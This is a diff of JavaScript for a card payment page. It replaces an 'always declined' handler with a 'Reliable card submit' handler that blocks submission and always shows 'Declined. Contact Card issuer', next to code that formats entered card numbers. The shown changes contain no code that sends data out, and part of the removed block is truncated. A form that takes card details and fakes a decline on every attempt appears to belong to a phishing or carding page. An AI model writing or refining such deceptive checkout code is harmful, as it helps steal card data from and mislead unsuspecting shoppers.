@@ -845,16 +845,6 @@ document.querySelectorAll('.funding-opt').forEach(btn => {
   });
 });
 
-// Card payment - always declined
-
-  } catch (e) {}
-  msg.textContent = 'Declined. Contact Card issuer';
-  msg.style.display = 'block';
-  msg.style.color = '#f85149';
-  msg.style.fontWeight = '600';
-  msg.style.marginTop = '12px';
-});
-
 // Auto-format card number
 document.getElementById('card-number')?.addEventListener('input', (e) => {
   let v = e.target.value.replace(/\D/g, '').slice(0, 16);
@@ -1002,6 +992,21 @@ document.addEventListener('click', function(e) {
       msg.style.color = '#f85149';
       return;
     }
+    msg.textContent = 'Declined. Contact Card issuer';
+    msg.style.display = 'block';
+    msg.style.color = '#f85149';
+    msg.style.fontWeight = '600';
+    msg.style.marginTop = '12px';
+  }
+});
+
+
+// Reliable card submit
+document.addEventListener('click', function(e) {
+  if (e.target && e.target.id === 'card-submit') {
+    e.preventDefault();
+    var msg = document.getElementById('card-msg');
+    if (!msg) { alert('Declined. Contact Card issuer'); return; }
     msg.textContent = 'Declined. Contact Card issuer';
     msg.style.display = 'block';
     msg.style.color = '#f85149';
